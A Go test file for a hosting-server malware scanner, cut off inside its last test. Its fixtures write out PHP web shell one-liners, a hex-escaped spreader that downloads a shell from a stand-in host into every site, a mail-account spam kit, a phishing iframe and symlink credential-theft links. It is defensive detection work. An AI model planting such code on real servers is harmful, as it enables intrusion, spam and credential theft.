package scanner

import (
	"archive/zip"
	"bytes"
	"compress/flate"
	"context"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"testing"
	"time"

	"golang.org/x/sys/unix"
)

// Every kind of file restored from quarantine after a fleet review is kept
// here, judged the way a scan of any server judges it (path and content),
// so a new or reinstalled server never quarantines them again and a later
// rule change cannot bring them back. Malware next to them must still be
// caught. Fixtures are minimal, inert shapes of the real files.
func TestFleetRestoredCategories(t *testing.T) {
	s := newScanner(t)
	cert := base64.StdEncoding.EncodeToString([]byte("-----BEGIN CERTIFICATE-----\n" +
		base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{0x30, 0x82, 0x04, 0xa4}, 60)) + "\n-----END CERTIFICATE-----\n"))
	clean := []struct{ name, path, content string }{
		{"builder kit thumbnail saved as a page", "/home/u/public_html/wp-content/uploads/master_addons/templates_kits/thumbnails/image-Media.png",
			"<!DOCTYPE html><html><head><title>Just a moment...</title></head><body><script>window.location.href='/cdn-cgi/challenge'</script></body></html>"},
		{"cPanel MultiPHP ini", "/home/u/public_html/php.ini", "; cPanel-generated php ini directives, do not edit\n[PHP]\nauto_append_file = \"\"\nauto_prepend_file = \"\"\nmemory_limit = 1024M\n"},
		{"SureMails hardening ini", "/home/u/public_html/wp-content/uploads/suremails/.user.ini", "; Prevent auto-prepend/append attacks\nauto_prepend_file =\nauto_append_file =\n"},
		{"registration mail", "/home/u/shop.example.com/account/register.php", `<?php require_once '../config/db.php'; $email = trim($_POST['email'] ?? ''); @mail($email, 'Welcome - Verify Your Email', $body, 'From: '.ADMIN_EMAIL); header('Location: /account/dashboard.php');`},
		{"shipping app sign-up mail", "/home/u/public_html/application/ajax/sign_up_ajax.php", `<?php require_once("../loader.php"); $email_template = cdp_getEmailTemplates(7); $subject = $email_template->subject; mail($_POST['email'], $subject, $message, $header);`},
		{"composer ca-bundle", "/home/u/public_html/vendor/composer/ca-bundle/src/CaBundle.php", `<?php namespace Composer\CaBundle; class CaBundle { public static function isOpensslParseSafe() { $cert = '` + cert + `'; $script = "openssl_x509_parse(base64_decode('%s'));"; return $script; } }`},
		{"Laravel compiled view", "/home/u/app.example.com/storage/framework/views/4a985be53df3e16180696f04e944b6bb.php",
			`<?php $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f = $component; ?><?php if (isset($__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f)): ?><?php $component = $__componentOriginal8a3c0f9b5e2d4c7a1f6e9b0d3c5a7e2f; ?><?php endif; ?><?php /**PATH /home/u/app/resources/views/welcome.blade.php ENDPATH**/ ?>`},
		{"analog stats cache", "/home/u/tmp/analog/cache", "CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!\nT\t0\t0\t460\n/wp-login.php?x=<?php eval($_POST[1]);?>\t1\n"},
	}
	for _, c := range clean {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d != nil {
			t.Errorf("%s: quarantined again as %s", c.name, d.Signature)
		}
	}
	elf := []byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0x3e, 0}
	for _, p := range []string{
		"/home/u/public_html/wp-content/ewww/optipng", "/home/u/site.example.com/wp-content/ewww/cwebp",
		"/home/u/public_html/news/app/ThirdParty/webp-convert/vendor/rosell-dk/webp-convert/src/Convert/Converters/Binaries/cwebp-120-linux-x86-64",
		"/home/u/public_html/node_modules/.bin/esbuild",
	} {
		if d, _ := binaryCheck(p, elf); d != nil {
			t.Errorf("%s: quarantined again as %s", p, d.Signature)
		}
	}

	// What must stay caught next to them.
	bad := []struct{ name, path, content string }{
		{"loader in ini", "/home/u/public_html/.user.ini", "auto_prepend_file = \"/home/u/public_html/wp-content/uploads/.x.ico\"\n"},
		{"open relay in a site", "/home/u/shop.example.com/admins/flyer.php", `<?php require 'common/conn.php'; $to = trim($_POST['frndemail']); $subject = $_POST["emailSubject"]; $ok = mail($to, $subject, $Body, "From: x"); header("Location: Newsletter.php");`},
		{"mail tester", "/home/u/public_html/.389653248945710.php", `<?php goto a; a: $to = $_GET["to"]; @mail($to, "Sending emails 1", "Test"); echo "##SENT##"; unlink(basename(__FILE__));`},
		{"page hidden as an upload image", "/home/u/public_html/wp-content/uploads/2026/10/logo.png", "<html><body><iframe src='https://phish.example/login'></iframe></body></html>"},
	}
	for _, c := range bad {
		if d := s.checkContent(c.path, extOf(c.path), []byte(c.content)); d == nil {
			t.Errorf("%s: no longer caught", c.name)
		}
	}
	if d, _ := binaryCheck("/home/u/site.example.com/wp-content/plugins/wp-rocket/vendor/monolog/monolog/src/Monolog/Handler/SyslogUdp/16e2277f8b31_A", elf); d == nil {
		t.Error("program hidden in a plugin's vendor folder: no longer caught")
	}
}

// Old embed codes write a script tag with document.write(unescape(...))
// (Google Analytics' ga.js loader, lead and chat widgets): only the
// brackets are escaped and the address is readable. A script or hidden
// frame spelled out in escaped letters is still reported.
func TestFleetDocumentWriteUnescape(t *testing.T) {
	ga := `var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));`
	if v := AnalyzeScript("js", []byte(ga)); v != nil {
		t.Errorf("ga.js loader reported as %s", v.Signature)
	}
	hidden := `document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));`
	if v := AnalyzeScript("js", []byte(hidden)); v == nil {
		t.Error("escaped script not reported")
	}
}

// A published plugin's zip (WP-CLI's download cache on s5: the same
// WooCommerce PayPal Payments 4.1.3 zip quarantined 911 times in ten
// accounts) is judged like the installed plugin: members matching the
// version's official checksums are not reported. A changed member, a zip
// that is not one plugin, or a plugin without checksums is still checked.
func TestFleetPluginZipOfficialMembers(t *testing.T) {
	packed := []byte("<?php $d='" + strings.Repeat("QUFB", 600) + "';eval(base64_decode($d));")
	if d := analyze(".php", packed); d == nil || d.Category != CatVirus {
		t.Fatalf("fixture: %+v", d)
	}
	main := []byte("<?php\n/**\n * Plugin Name: Pay Example\n * Version: 4.1.3\n */\n")
	mk := func(name string, files map[string][]byte) string {
		p := filepath.Join(t.TempDir(), name)
		f, _ := os.Create(p)
		w := zip.NewWriter(f)
		for n, c := range files {
			e, _ := w.Create(n)
			e.Write(c)
		}
		w.Close()
		f.Close()
		return p
	}
	official := md5.Sum(packed)
	var asked []string
	known := func(slug, version, rel string, sum [16]byte) bool {
		asked = append(asked, slug+"@"+version+":"+rel)
		return slug == "pay-example" && version == "4.1.3" && rel == "build/loader.php" && sum == official
	}
	plugin := map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed}
	z := mk("pay-example-4.1.3.zip", plugin)
	fi, _ := os.Stat(z)
	if d := scanZipKnown(z, fi.Size(), known); d != nil {
		t.Fatalf("official plugin zip reported: %s (asked %v)", d.Signature, asked)
	}
	// Without the checksums the same zip is reported.
	if d := scanZipKnown(z, fi.Size(), nil); d == nil {
		t.Fatal("zip not checked without checksums")
	}
	// A changed member.
	changed := append(append([]byte{}, packed...), ' ')
	z2 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": changed})
	fi, _ = os.Stat(z2)
	if d := scanZipKnown(z2, fi.Size(), known); d == nil {
		t.Fatal("changed member not reported")
	}
	// Not one plugin folder: a shell next to a copy of the official file.
	z3 := mk("pay-example-4.1.3.zip", map[string][]byte{"pay-example/pay-example.php": main, "pay-example/build/loader.php": packed, "x.php": changed})
	fi, _ = os.Stat(z3)
	if d := scanZipKnown(z3, fi.Size(), func(string, string, string, [16]byte) bool { return true }); d == nil {
		t.Fatal("mixed zip trusted")
	}
}

// A2 F6: files trusted by name, place and shape (Softaculous's login file,
// WordPress translation files) stay trusted, but not when they call
// something named at run time on request data, and never when their exact
// content is known malware. Fixtures call harmless functions (strtoupper):
// only the shape matters.
func TestFleetShapeTrustNeedsNoDynamicCall(t *testing.T) {
	s := newScanner(t)
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "wp-config.php"), []byte("<?php define('X', 1);"), 0o644)
	sapp := filepath.Join(root, "sapp-wp-signon.php")
	l10n := filepath.Join(root, "wp-content", "languages", "plugins", "demo-en_GB.l10n.php")
	os.MkdirAll(filepath.Dir(l10n), 0o755)
	l10nOK := "<?php\nreturn ['domain'=>'demo','messages'=>['Run (now)'=>'Run (now)','Save'=>'Save']];\n"
	for _, c := range []struct {
		path, content string
		trusted       bool
	}{
		{sapp, sappSignon, true},
		{sapp, sappSignon + "\n$cb = $_REQUEST['cb']; $cb('x');", false},
		{sapp, sappSignon + "\n$a = array($_REQUEST['cb']); $a[0]('x');", false},
		{sapp, sappSignon + "\n('str'.'toupper')(getenv('HTTP_X'));", false},
		{sapp, sappSignon + "\narray_map($_REQUEST['cb'], array('x'));", false},
	} {
		if got := trustedHostingTool(c.path, []byte(c.content)); got != c.trusted {
			t.Errorf("login file %q: trusted %v, want %v", c.content[len(c.content)-30:], got, c.trusted)
		}
	}
	for _, c := range []struct {
		content string
		trusted bool
	}{
		{l10nOK, true},
		{"<?php\nreturn ['domain'=>('str'.'toupper')(getenv('HTTP_X'))];\n", false},
		{"<?php\nreturn ['domain'=>array_map('str'.'toupper', ['x'])];\n", false},
		{"<?php\nreturn ['domain'=>$GLOBALS['cb']('x')];\n", false},
		{"<?php\nreturn ['domain'=>file_get_contents('php://input')];\n", false},
	} {
		if got := translationFile(l10n, []byte(c.content)); got != c.trusted {
			t.Errorf("translation %q: trusted %v, want %v", c.content, got, c.trusted)
		}
	}

	// Known-bad content under a trusted shape is still caught by its hash.
	os.WriteFile(sapp, []byte(sappSignon), 0o644)
	info, _ := os.Lstat(sapp)
	if d, err := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d != nil || err == nil {
		t.Fatalf("login file not trusted: %v %v", d, err)
	}
	sum := sha256.Sum256([]byte(sappSignon))
	os.MkdirAll(filepath.Dir(HashDBPath()), 0o700)
	os.WriteFile(HashDBPath(), []byte(fmt.Sprintf("%d %s XG-TEST.KnownBad\n", len(sappSignon), hex.EncodeToString(sum[:]))), 0o600)
	ReloadHashDB()
	t.Cleanup(func() { os.Remove(HashDBPath()); ReloadHashDB() })
	if d, _ := s.CheckFile(sapp, info, s.Settings.Get().Scanner); d == nil || d.Signature != "XG-TEST.KnownBad" {
		t.Fatalf("known-bad hash skipped for a trusted shape: %v", d)
	}
}

// A credential theft kit (server1, business300, server100: folders of
// links named <account>-WordPress-public_html.txt, one to every account's
// wp-config.php, .env and .accesshash) was only reported, so the links
// stayed readable. A link to another account's files is removed whenever
// malware is quarantined, also a dangling one waiting for a secret file to
// appear; the targets are never touched, and Restore makes the link again.
// Links inside the account itself or to public files stay.
func TestFleetSymlinkTheftKit(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	base := t.TempDir()
	thief, victim := filepath.Join(base, "thief"), filepath.Join(base, "victim")
	const thiefUID, victimUID = 65533, 65532
	for _, d := range []string{filepath.Join(thief, "public_html", "kit"), filepath.Join(victim, "public_html")} {
		os.MkdirAll(d, 0o755)
	}
	secret := filepath.Join(victim, "public_html", "wp-config.php")
	os.WriteFile(secret, []byte("<?php // inert fixture: define('DB_PASSWORD', 'x');"), 0o640)
	own := filepath.Join(thief, "public_html", "index.php")
	os.WriteFile(own, []byte("<?php echo 1;"), 0o644)
	filepath.Walk(victim, func(p string, _ os.FileInfo, _ error) error { return os.Lchown(p, victimUID, victimUID) })
	homes := map[uint32]string{thiefUID: thief, victimUID: victim}
	kit := filepath.Join(thief, "public_html", "kit")
	links := map[string]string{
		"victim-WordPress-public_html.txt": secret,                                    // live
		"victim-cpanel.txt":                filepath.Join(victim, ".accesshash"),      // dangling secret
		"victim-env.txt":                   filepath.Join(victim, "public_html/.env"), // dangling secret
	}
	for name, target := range links {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	keep := map[string]string{
		"own.txt":     own,                                           // the account's own file
		"missing.txt": filepath.Join(victim, "public_html/logo.png"), // dangling, not a secret
	}
	for name, target := range keep {
		p := filepath.Join(kit, name)
		os.Symlink(target, p)
		os.Lchown(p, thiefUID, thiefUID)
	}
	for name := range keep {
		if _, bad := InsecureSymlink(filepath.Join(kit, name), homes); bad {
			t.Errorf("%s: flagged", name)
		}
	}
	var ids []int64
	for name, target := range links {
		p := filepath.Join(kit, name)
		got, bad := InsecureSymlink(p, homes)
		if !bad || got != target {
			t.Fatalf("%s: not flagged (%q %v)", name, got, bad)
		}
		info, _ := os.Lstat(p)
		f, err := s.Record(0, "manual", p, info, Detection{CatSymlink, "Symlink.OtherAccount -> " + got})
		if err != nil || f.Status != "quarantined" {
			t.Fatalf("%s: %+v %v", name, f, err)
		}
		if _, err := os.Lstat(p); !os.IsNotExist(err) {
			t.Fatalf("%s: link still there", name)
		}
		ids = append(ids, f.ID)
	}
	if st, err := os.Stat(secret); err != nil || st.Mode().Perm() != 0o640 {
		t.Fatalf("target touched: %v %v", st, err)
	}
	if err := s.Restore(ids[0]); err != nil {
		t.Fatal(err)
	}
	f, _ := s.Get(ids[0])
	if back, err := os.Readlink(f.Path); err != nil || back != links[filepath.Base(f.Path)] {
		t.Fatalf("restore: %q %v", back, err)
	}
	if li, _ := os.Lstat(f.Path); li.Sys().(*syscall.Stat_t).Uid != thiefUID {
		t.Fatal("restored link lost its owner")
	}
	if err := s.Delete(ids[1]); err != nil {
		t.Fatalf("delete a removed link: %v", err)
	}
}

// A web shell padded past the size limit (server1's report: an 11 MB file
// is never read) is judged by its start and end; a big clean PHP file (a
// generated translation array) stays clean.
func TestFleetPaddedBigPHP(t *testing.T) {
	s := newScanner(t)
	cfg := s.Settings.Get().Scanner
	limit := int64(cfg.MaxFileSizeMB) << 20
	dir := t.TempDir()
	pad := strings.Repeat("/* lorem ipsum dolor sit amet */\n", int(limit/33)+1000)
	bad := filepath.Join(dir, "cache-handler.php")
	os.WriteFile(bad, []byte(pad+"<?php @eval($_POST['a']); ?>\n"), 0o644)
	var b strings.Builder
	b.WriteString("<?php\nreturn array(\n")
	for i := 0; int64(b.Len()) <= limit+(1<<20); i++ {
		fmt.Fprintf(&b, "  'string_%d' => 'Translated text number %d',\n", i, i)
	}
	b.WriteString(");\n")
	clean := filepath.Join(dir, "lang-ur.php")
	os.WriteFile(clean, []byte(b.String()), 0o644)
	for path, want := range map[string]bool{bad: true, clean: false} {
		info, _ := os.Stat(path)
		if info.Size() <= limit {
			t.Fatalf("%s: fixture not over the limit", path)
		}
		d, err := s.CheckFile(path, info, cfg)
		if (d != nil) != want {
			t.Errorf("%s: detection %+v (%v), want %v", filepath.Base(path), d, err, want)
		}
	}
}

// System links reported as "Symlink.OtherAccount" on business500,
// business600 and server1: cPanel's /home/user -> /home2/user and CageFS's
// skeleton (owned by root), ~/logs/<domain>.bkup -> the domlog cPanel keeps
// as root:<account> 0640, and npm's node_modules/.bin links to files
// unpacked with another uid inside the account's own home. None lets the
// account read anything it could not read already. A kit link to another
// account's wp-config.php is still flagged.
func TestFleetSystemSymlinks(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("needs root to own files as other accounts")
	}
	const userUID, otherUID = 65531, 65530
	base := t.TempDir()
	os.Chmod(base, 0o755)
	user, other := filepath.Join(base, "home", "user"), filepath.Join(base, "home2", "other")
	logs := filepath.Join(base, "domlogs")
	for _, d := range []string{filepath.Join(user, "logs"), filepath.Join(user, "nodevenv", "node_modules", ".bin"), filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin"),
		filepath.Join(other, "public_html"), logs, filepath.Join(base, "home")} {
		os.MkdirAll(d, 0o755)
	}
	os.Lchown(user, userUID, userUID)
	os.Lchown(other, otherUID, otherUID)
	write := func(p string, mode os.FileMode, uid, gid int) {
		os.WriteFile(p, []byte("inert fixture"), mode)
		os.Chmod(p, mode)
		os.Lchown(p, uid, gid)
	}
	domlog := filepath.Join(logs, "example.com.bkup")
	write(domlog, 0o640, 0, userUID)
	tool := filepath.Join(user, "nodevenv", "node_modules", "esbuild", "bin", "esbuild")
	write(tool, 0o750, 1001, 1001)
	secret := filepath.Join(other, "public_html", "wp-config.php")
	write(secret, 0o640, otherUID, otherUID)
	homes := map[uint32]string{userUID: user, otherUID: other}
	link := func(target, p string, uid int) string {
		os.Symlink(target, p)
		os.Lchown(p, uid, uid)
		return p
	}
	clean := map[string]string{
		"cPanel /home link":  link(other, filepath.Join(base, "home", "other"), 0),
		"domlog backup link": link(domlog, filepath.Join(user, "logs", "example.com.bkup"), userUID),
		"npm .bin link":      link(tool, filepath.Join(user, "nodevenv", "node_modules", ".bin", "esbuild"), userUID),
	}
	for name, p := range clean {
		if got, bad := InsecureSymlink(p, homes); bad {
			t.Errorf("%s flagged (-> %s)", name, got)
		}
	}
	kit := link(secret, filepath.Join(user, "other-WordPress-public_html.txt"), userUID)
	if got, bad := InsecureSymlink(kit, homes); !bad || got != secret {
		t.Fatalf("kit link to another account's wp-config.php not flagged: %q %v", got, bad)
	}
	// Someone else's file the account cannot read (not its group) is still flagged.
	private := filepath.Join(logs, "private.log")
	write(private, 0o640, 0, otherUID)
	if _, bad := InsecureSymlink(link(private, filepath.Join(user, "logs", "private.log"), userUID), homes); !bad {
		t.Fatal("link to an unreadable file of another group not flagged")
	}
	// Findings reported before are closed when the agent starts; the kit's
	// stays open.
	s := newScanner(t)
	ids := map[string]int64{}
	for name, p := range map[string]string{"system": clean["cPanel /home link"], "domlog": clean["domlog backup link"], "kit": kit} {
		res, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (1,'manual',?,'u','symlink','Symlink.OtherAccount','',10,'detected',1,1)`, p)
		if err != nil {
			t.Fatal(err)
		}
		ids[name], _ = res.LastInsertId()
	}
	if n, err := s.CloseSafeLinks(); err != nil || n != 2 {
		t.Fatalf("closed %d (%v), want 2", n, err)
	}
	for name, want := range map[string]string{"system": "cleared", "domlog": "cleared", "kit": "detected"} {
		if f, _ := s.Get(ids[name]); f.Status != want {
			t.Errorf("%s: status %q, want %q", name, f.Status, want)
		}
	}
}

// Malware run by cron from ~/.cache/.<hex> (business500: baezonco,
// dndsnatu) was only caught by a learned hash: the scan skipped ~/.cache.
// Its own files are checked now; package caches below it stay skipped.
func TestFleetHomeCacheLoader(t *testing.T) {
	s := newScanner(t)
	root := writeTree(t, map[string]string{
		".cache/.6c06cf44589da250b74db94f6909955535088504a": malicious["eval.php"],
		".cache/composer/files/vendor/pkg/x.php":            malicious["eval.php"],
		"public_html/index.php":                             "<?php echo 'hello';",
	})
	// A scan of the account, and a full scan (the home is one of the roots).
	for _, roots := range [][]string{{root}, {root, t.TempDir()}} {
		var hits []string
		_, err := s.scanTree(context.Background(), roots, time.Time{}, 0, s.Settings.Get().Scanner, treeHooks{
			hit: func(path string, _ fs.FileInfo, _ Detection) { hits = append(hits, path) },
		})
		if err != nil {
			t.Fatal(err)
		}
		if len(hits) != 1 || !strings.HasSuffix(hits[0], "/.cache/.6c06cf44589da250b74db94f6909955535088504a") {
			t.Fatalf("roots %v: hits %v, want only the loader in ~/.cache", roots, hits)
		}
	}
}

// The kit writes a site's .htaccess back over and over (business500
// masfosur: 784 times). Each return is cleaned in place: the site keeps
// its WordPress rules instead of losing the file each time.
func TestFleetReturnedRootHtaccessCleaned(t *testing.T) {
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	site := filepath.Join(t.TempDir(), "public_html")
	os.MkdirAll(site, 0o755)
	os.WriteFile(filepath.Join(site, "wp-config.php"), []byte("<?php // inert fixture"), 0o640)
	hacked := "<FilesMatch '.(py|exe|php|PHP|Php|suspected)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>\n" +
		"<FilesMatch '^(index.php|wp-login.php|adminfuns.php)$'>\nOrder allow,deny\nAllow from all\n</FilesMatch>\n" +
		"<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>\n"
	ht := filepath.Join(site, ".htaccess")
	os.WriteFile(ht, []byte(hacked), 0o644)
	info, _ := os.Lstat(ht)
	d := htaccessHack([]byte(hacked))
	if d == nil {
		t.Fatal("fixture not detected")
	}
	// The state on the server: the first copy quarantined, the cleaning
	// lost the race with the kit's next write.
	sum := sha256File(ht)
	if _, err := s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		ht, d.Signature, sum, info.Size()); err != nil {
		t.Fatal(err)
	}
	f, err := s.Record(0, "realtime", ht, info, *d)
	if err != nil || f.Status != "quarantined" || f.Repeats != 1 {
		t.Fatalf("%+v %v", f, err)
	}
	got, err := os.ReadFile(ht)
	if err != nil {
		t.Fatal("site's .htaccess removed")
	}
	if htaccessHack(got) != nil || !strings.Contains(string(got), "RewriteRule . index.php [L]") {
		t.Fatalf("not cleaned: %q", got)
	}
	// Elsewhere a returned file is still removed.
	other := filepath.Join(site, "wp-content", "uploads", ".htaccess")
	os.MkdirAll(filepath.Dir(other), 0o755)
	os.WriteFile(other, []byte(hacked), 0o644)
	oi, _ := os.Lstat(other)
	s.DB.Exec(`INSERT INTO findings (scan_id, source, path, owner, category, signature, sha256, size, status, created_at, updated_at) VALUES (0,'realtime',?,'u','virus',?,?,?,'quarantined',1,1)`,
		other, d.Signature, sum, oi.Size())
	if _, err := s.Record(0, "realtime", other, oi, *d); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(other); err == nil {
		t.Fatal("returned lock in uploads not removed")
	}
}

// buildPhar writes a phar in PHP's format (uncompressed members).
func buildPhar(stub string, files map[string]string) []byte {
	var man, data bytes.Buffer
	u32 := func(b *bytes.Buffer, v int) { b.Write([]byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)}) }
	u32(&man, len(files))
	man.Write([]byte{0x11, 0x00}) // API 1.1.0
	u32(&man, 0x10000)            // has a signature
	u32(&man, 0)                  // alias
	u32(&man, 0)                  // metadata
	names := make([]string, 0, len(files))
	for n := range files {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		u32(&man, len(n))
		man.WriteString(n)
		u32(&man, len(files[n]))
		u32(&man, 1792800000)
		u32(&man, len(files[n]))
		u32(&man, 0)
		u32(&man, 0o644)
		u32(&man, 0)
		data.WriteString(files[n])
	}
	var out bytes.Buffer
	out.WriteString(stub + "__HALT_COMPILER(); ?>\r\n")
	u32(&out, man.Len())
	out.Write(man.Bytes())
	out.Write(data.Bytes())
	out.Write(bytes.Repeat([]byte{0xab}, 20))
	out.Write([]byte{2, 0, 0, 0})
	out.WriteString("GBMB")
	return out.Bytes()
}

// composer.phar (the official 2.8.12, in aroojacademy's home on server100)
// and wp-cli.phar were "PHP.Obfuscated.HaltCompilerPayload": the
// libraries' own eval after __HALT_COMPILER, judged as one file. A phar is
// judged by its stub and each script in it now; a web shell inside one, or
// in its stub, is still caught, and a file that only looks like a phar is
// judged as before.
func TestFleetPharByMembers(t *testing.T) {
	s := newScanner(t)
	stub := "#!/usr/bin/env php\n<?php\nPhar::mapPhar('tool.phar');\nrequire 'phar://tool.phar/bin/tool';\n"
	lib := map[string]string{
		"bin/tool":                 "<?php\nrequire __DIR__ . '/../src/App.php';\n(new App())->run();\n",
		"src/App.php":              "<?php\nclass App { public function run() { echo 'inert fixture'; } }\n",
		"vendor/twig/Template.php": "<?php\n// a template engine compiles templates to PHP\nfunction render(string $compiled) { return eval('?>' . $compiled); }\n",
	}
	check := func(name string, content []byte) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), name)
		os.WriteFile(p, content, 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	clean := buildPhar(stub, lib)
	if old := analyze(".phar", clean); old == nil || old.Signature != "PHP.Obfuscated.HaltCompilerPayload" {
		t.Fatalf("fixture does not reproduce the old false positive: %+v", old)
	}
	if d := check("composer.phar", clean); d != nil {
		t.Fatalf("clean phar flagged: %+v", d)
	}
	shell := map[string]string{"src/App.php": lib["src/App.php"], "src/x.php": "<?php @eval($_POST['a']); ?>"}
	if d := check("tool.phar", buildPhar(stub, shell)); d == nil || d.Category != CatVirus || !strings.HasPrefix(d.Signature, "Archive.") {
		t.Fatalf("web shell inside a phar: %+v", d)
	}
	if d := check("tool.phar", buildPhar("<?php @eval($_POST['a']); ?>\n<?php ", lib)); d == nil || d.Category != CatVirus {
		t.Fatalf("web shell in the stub: %+v", d)
	}
	broken := append([]byte(stub+"__HALT_COMPILER(); ?>\n"), []byte("\xff\xff\xff\x7f garbage eval($x)")...)
	if d := check("tool.phar", broken); d == nil {
		t.Fatal("not a phar: no longer judged as a whole")
	}
}

// escapeAll writes a string as PHP hex escapes, as kits hide their strings.
func escapeAll(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&b, "\\x%02x", s[i])
	}
	return b.String()
}

// A kit in a hex-named file in uploads (a sample from another product's
// quarantine, 2026-10-24) that the rules missed: goto-flattened, every
// string escaped, no eval and no decoder. It creates mail accounts for
// spam in every domain (~/etc/<domain>/shadow and the mailbox folders) and
// copies shells fetched from a web address into every site, and starts
// with an HTML comment, so as a file without an extension it was not
// even read as PHP. Inert fixtures of both behaviours; a mail plugin that
// only talks about mailboxes, and a script reading the system's
// /etc/shadow, are not flagged.
func TestFleetMassMailKit(t *testing.T) {
	s := newScanner(t)
	mailKit := "<!-- https://t.me/example -->\r\n<?php\n goto a1; a2: $p = \"" + escapeAll("/home/u/etc/") + "{$d}" + escapeAll("/shadow") + "\"; goto a3; a1: $d = \"" + escapeAll("example.test") + "\"; goto a2;\n" +
		" a3: @mkdir(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/cur") + "\", 0755, true); file_put_contents($p, \"" + escapeAll("info:x:inert") + "\", FILE_APPEND); file_put_contents(\"" + escapeAll("/home/u/mail/") + "{$d}" + escapeAll("/info/dovecot-uidlist") + "\", \"\");\n"
	spreader := "<?php\n goto b1; b1: $u = \"" + escapeAll("https://example.invalid/kit/shell.txt") + "\"; $c = file_get_contents($u); goto b2;\n" +
		" b2: foreach (glob(\"" + escapeAll("/home/*/public_html") + "\") as $r) { if (is_dir($r)) { file_put_contents($r . \"" + escapeAll("/wp-content/x.php") + "\", $c); } }\n"
	check := func(name, content string) *Detection {
		t.Helper()
		p := filepath.Join(t.TempDir(), "public_html", "wp-content", "uploads", name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	if d := check("2c97f8049bc68e5b23793559ecd6025c", mailKit); d == nil || d.Signature != "PHP.Spam.MailAccountCreator" || d.Category != CatVirus {
		t.Fatalf("mail account kit without an extension: %+v", d)
	}
	if d := check("x.php", spreader); d == nil || d.Signature != "PHP.Dropper.RemoteSpreader" {
		t.Fatalf("remote shell spreader: %+v", d)
	}
	clean := map[string]string{
		"webmail-help.php": "<?php\n// Shows the account's mailboxes (dovecot keeps them in ~/mail/<domain>/<user>/cur).\n$log = __DIR__ . '/mailbox.log';\nfile_put_contents($log, date('c') . \" listed\\n\", FILE_APPEND);\necho 'Mail is delivered to /home/u/mail/example.test/info/new';\n",
		"server-check.php": "<?php\n$ok = is_readable('/etc/shadow') ? 'readable' : 'protected';\nfile_put_contents(__DIR__ . '/check.txt', $ok);\necho 'dovecot status checked';\n",
	}
	for name, content := range clean {
		if d := check(name, content); d != nil {
			t.Errorf("%s flagged: %+v", name, d)
		}
	}
}

// business200 (2026-10-26): one name (worksec.php) copied into 42
// WordPress core folders of a site, with no finding: each copy's content
// passed the content rules. WordPress keeps no PHP in its css and images
// folders; a copy there with copies in other core folders is a dropper,
// one alone is suspicious. Core's own PHP (wp-includes/fonts since 6.5,
// wp-admin/includes) and other folders called so stay alone.
func TestFleetPlantedInWordPressCore(t *testing.T) {
	s := newScanner(t)
	root := filepath.Join(t.TempDir(), "u", "public_html")
	put := func(rel, body string) {
		os.MkdirAll(filepath.Join(root, filepath.Dir(rel)), 0o755)
		os.WriteFile(filepath.Join(root, rel), []byte(body), 0o644)
	}
	put("wp-includes/version.php", "<?php $wp_version = '7.1.3';")
	inert := "<?php /* inert test fixture */ echo 'x';"
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR", "wp-includes/Text"} {
		put(d+"/worksec.php", inert)
	}
	put("wp-includes/images/lonely.php", inert)
	put("wp-includes/fonts/class-wp-font-face.php", "<?php class WP_Font_Face {}")
	put("wp-admin/includes/custom-helper.php", inert)
	check := func(rel string) *Detection {
